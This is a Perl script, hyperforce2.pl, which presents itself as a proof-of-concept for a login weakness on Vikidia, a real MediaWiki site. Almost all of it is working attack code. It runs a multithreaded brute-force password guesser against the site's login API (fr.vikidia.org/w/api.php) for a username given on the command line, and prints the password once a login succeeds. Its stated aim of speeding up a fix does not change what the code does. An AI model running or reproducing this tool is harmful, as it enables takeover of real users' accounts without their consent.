#! /usr/bin/perl -w

# -----------------------------------------------------.
#  * hyperforce2.pl                                    !
# This script is a proof-of-concept about how easy     !
#   identity stealing can be on http://*.vikidia.org.  !
# Therefore, it is not designed to break into an       !
#   account... but might be used to do it.             !
# I hope this script will, well... encourage to fix    !
#   it as fast as possible!                            !
#                                                      !
# This is a multithreaded, "kept-alive" improvement of !
#  the original hyperforce.pl script.                  !
#                                                      !
# Designed by thilp under the DO WHAT THE FUCK YOU     !
#   WANT TO PUBLIC LICENSE, version 2                  !
#   (http://sam.zoy.org/wtfpl/).                       !
# -----------------------------------------------------'

use threads;
use strict;
use List::Util qw(min);
use LWP::UserAgent;
use HTTP::Cookies;

print "\n    *** Welcome to hyperforce2! ***\n\n";
print "  This little script tries to guess your target's password on Vikidia.\n";
print "  It is able to do it because of a *major security breach* in the\n";
print "  MediaWiki's authentication process which allows a new login request\n";
print "  immediatly after an erroneous one.\n\n";
print "  You will be notified each 100 requests (because displaying each\n";
print "  password slows the bruteforce). This allows you to relaunch the\n";
print "  attack from a given password instead of from the beginning.\n";
print "  Just modify in the code the first value of the \@struct variable.\n\n";
print "  I made this program to accelerate the fixing procedure which was a\n";
print "  little slow ;)\n\n";

# GLOBAL
  my $ua = LWP::UserAgent->new(
    agent => 'Hyperion/5.0.perl (thilp/bot/lol)',
    cookie_jar => HTTP::Cookies->new(
      file => 'cookies.txt',
      autosave => 1,
      keep_alive => 1,
      ignore_discard => 1
    )
  );
  $ua->timeout(10);
# END GLOBAL

sub requeteAPI0
{
  my %params = ('format' => 'xml',
		'action' => 'login',
		'lgname' => $_[0]);

  my $rep = $ua->post(
    'http://fr.vikidia.org/w/api.php',
    Content_Type => 'application/x-www-form-urlencoded',
    Content => \%params
   );
  return $rep->status_line unless $rep->is_success;
  return $rep->content;
}
sub requeteAPI1
{
  my %params = ('format' => 'xml',
		'action' => 'login',
		'lgname' => $_[0],
		'lgpassword' => $_[1],
		'lgtoken' => $_[2]);

  my $rep = $ua->post(
    'http://fr.vikidia.org/w/api.php',
    Content_Type => 'application/x-www-form-urlencoded',
    Content => \%params
   );
  return $rep->status_line unless $rep->is_success;
  return $rep->content;
}

sub connexion
{
  my $r;
  while (!defined($r))
  {
    my ($pseudo,$mdp) = @_;
    my ($result,$jeton) = (requeteAPI0($pseudo) =~
      /\bresult="([^"]+)"(?: token="([0-9a-f]{32})")?/);

    ($result) = (requeteAPI1($pseudo, $mdp, $jeton) =~ /\bresult="([^"]+)"/);
    $r = $result;
  }
  return $r eq 'Success';
}

# PASSWORD GENERATION

# @struct describes the password structure
my @struct = (1,4,10,21,29);
# @table contains all the strings that can be assembled to generate $pwd
my @table = (
  # WORDS
#  'bonjour','salut','pass','motdepasse','azerty', 'vikidia',
#  'viki','wiki','lol',
  # LETTERS
  'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q',
  'r','s','t','u','v','w','x','y','z',
  # NUMBERS
  '0','1','2','3','4','5','6','7','8','9',
#  '10','11','12','13','14','15','16','17','18','19',
#  '20','21','22','23','24','25','26','27','28','29',
#  '30','31','32','33','34','35','36','37','38','39',
#  '40','41','42','43','44','45','46','47','48','49',
#  '50','51','52','53','54','55','56','57','58','59',
#  '60','61','62','63','64','65','66','67','68','69',
#  '70','71','72','73','74','75','76','77','78','79',
#  '80','81','82','83','84','85','86','87','88','89',
#  '90','91','92','93','94','95','96','97','98','99',
  # SYMBOLS
  '!','-','+',
  # SERIES
  '12345678','123456','6789','9876','987654321','357',
  '2468'
);

# Generation function: returns the password generated from the structure
sub generate_pwd
{
  my ($ref_struct, $thread_number) = @_;
  my ($rank, $ret) = (1, '');

  # Receives a well-formed structure. Returns the string formed from it.
  foreach (@$ref_struct)
  {
    $ret .= $table[$_];
  }

  # Generates the next structure by adding $thread_number to it.
  $$ref_struct[-1] += $thread_number;

  # Corrects the inconstistencies
  while ($$ref_struct[-$rank] >= scalar(@table))
  {
    $$ref_struct[-$rank] -= scalar(@table);
    $$ref_struct[-$rank - 1]++;
    if ($rank == scalar(@$ref_struct))
    {
      $$ref_struct[0]++;
      $$ref_struct[scalar(@$ref_struct)] = $$ref_struct[-1];
      for (my $i = 1; $i < scalar(@$ref_struct); $i++)
      {
	$$ref_struct[$i] = 0;
      }
    }
    else
    {
      $rank++;
    }
  }
  return $ret;
}


sub guess_passwd
{
  my ($thread_id, $thread_number) = @_;
  my ($ret, $count_tests, $count_print, $pass) = (0, 0, -1, '');

  # Initializes the structure according to $thread_id
  $struct[-1] = $thread_id;

  while ($ret == 0)
  {
    $pass = generate_pwd(\@struct, $thread_number);
    if ($count_tests % 100 == 0)
    {
      $count_print++;
      $count_print %= $thread_number;
      if ($count_print == $thread_id)
      {
	print("Trying with $pass...\n");
      }
    }
    my $result;
    $ret = connexion($ARGV[0], $pass, \$result);
    $count_tests += $thread_number;
  }
  print "PASSWORD FOUND! >> ".$pass."\n";
}


# User interaction and main script

my $thread_number;
my @thread_array;

if (@ARGV == 0)
{
  print "Usage: ./hyperforce2.pl <target> [<number of threads>]\n";
  exit 1;
}

if (@ARGV == 1)
{
  $thread_number = 1;
}
else
{
  $thread_number = min(8, $ARGV[1]);
}

# Thread creation
for (my $i = 0; $i < $thread_number; $i++)
{
  $thread_array[$i] = threads->create({'void' => 1},
				      'guess_passwd', $i, $thread_number);
}
for (my $i = 0; $i < $thread_number; $i++)
{
  $thread_array[$i]->join();
}
